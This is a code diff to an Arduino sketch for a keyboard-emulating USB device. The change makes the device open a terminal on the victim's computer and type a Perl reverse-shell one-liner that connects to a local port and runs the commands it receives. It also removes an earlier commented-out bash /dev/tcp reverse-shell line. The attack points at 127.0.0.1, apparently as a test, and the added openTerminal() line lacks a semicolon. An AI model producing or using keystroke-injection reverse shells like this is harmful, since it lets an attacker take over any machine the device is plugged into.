@@ -10,26 +10,18 @@ void setup() {
 
   delay(1000);
 
-  openTerminal();
-
-
-  //openApp("google-chrome");
-  //type("/bin/bash ");
-  //type("exec 196<>/dev/tcp/127.0.0.1/5000; <&196 >&196 2>&196");
-  //openApp("start chrome 'google.com' ");
-
-  run("google-chrome");
-
-  // windowsRun("");
-
-  delay(2000);
+  openTerminal()
+  type("perl -MIO::Socket -e'$c=new IO::Socket::INET(\"127.0.0.1:1234\");print $c `$_`while<$c>'");
+  type("exit");
 }
-
 
 // universal
 
+// type text and hit enter
+
 void type(String chars) {
   Keyboard.print(chars);
+  delay(20);
   Keyboard.println("");
 }
 
@@ -93,7 +85,7 @@ void windowsRun(String cmd) {
 void loop() {
   // flash when done
   digitalWrite(led, HIGH);
-  delay(100);
+  delay(200);
   digitalWrite(led, LOW);
-  delay(100);
+  delay(200);
 }
